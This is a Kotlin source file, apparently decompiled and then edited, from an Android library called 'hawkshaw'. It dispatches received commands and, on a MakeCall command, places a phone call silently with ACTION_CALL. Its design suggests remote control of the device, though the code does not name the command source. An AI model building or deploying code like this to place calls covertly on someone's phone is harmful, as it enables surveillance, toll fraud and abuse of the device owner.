package com.hawkshaw.library.features.telephony

import android.content.Intent
import android.net.Uri
import com.hawkshaw.library.App
import com.hawkshaw.library.datalayer.models.Command
import com.hawkshaw.library.ktextensions.ManifestPermissionsKt.hasPermission
import com.hawkshaw.library.logger.Logger
import android.util.Log // Added for logging
import androidx.core.net.toUri

private const val TAG = "TelephonyHandler"

/**
 * Handles telephony-related commands
 * 
 * @param command Command to handle
 */
fun handleTelephonyCommand(command: Command) {
    Log.d(TAG, "[DEBUG] handleTelephonyCommand called. Command Type: ${command.type}, Request: $command")
    when (command.type) {
        Command.CommandType.MakeCall -> {
            Log.d(TAG, "[DEBUG] Matched CommandType.MakeCall. Request: ${command.makeCallRequest}")
            makeCall(command.makeCallRequest)
        }
        else -> {
            Log.d(TAG, "[DEBUG] Unhandled command type: ${command.type}. Doing nothing.")
            /* Do nothing for other command types */
        }
    }
}

/**
 * Initiates a phone call
 * 
 * @param makeCallRequest Request containing the phone number to call
 */
private fun makeCall(makeCallRequest: Command.MakeCallRequest?) {
    Log.d(TAG, "[DEBUG] makeCall called with request: $makeCallRequest")
    if (makeCallRequest == null) {
        Log.d(TAG, "[DEBUG] makeCallRequest is null. Returning.")
        return
    }
    
    Log.d(TAG, "[DEBUG] makeCall: Checking for android.permission.CALL_PHONE permission.")
    if (!hasPermission("android.permission.CALL_PHONE")) {
        Log.w(TAG, "[DEBUG] makeCall: CALL_PHONE permission DENIED.")
        Logger.e( // Existing log
            TAG,
            "MakeCall: You don't have call_phone permission",
            b = false,
            i = 12,
            nothing = null
        )
        return
    }
    Log.d(TAG, "[DEBUG] makeCall: CALL_PHONE permission GRANTED.")

    val callUri = "tel:${makeCallRequest.phoneNumber}".toUri()
    Log.d(TAG, "[DEBUG] makeCall: Call URI created: $callUri")

    val intent = Intent(Intent.ACTION_CALL).apply {
        data = callUri
        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
    }
    Log.d(TAG, "[DEBUG] makeCall: Intent created - Action: ${intent.action}, Data: ${intent.data}, Flags: ${intent.flags}")

    try {
        Log.d(TAG, "[DEBUG] makeCall: Attempting to App.getContext().startActivity(intent).")
        App.getContext().startActivity(intent)
        Log.d(TAG, "[DEBUG] makeCall: startActivity called successfully.")
    } catch (e: Exception) {
        Log.e(TAG, "[DEBUG] makeCall: Exception during startActivity: ${e.message}", e)
        // Optionally, re-throw or handle as per your app's error strategy
        // For now, just logging the error.
        Logger.e(TAG, "MakeCall: Error starting call activity - ${e.message}", e, false, 12, null)
    }
}
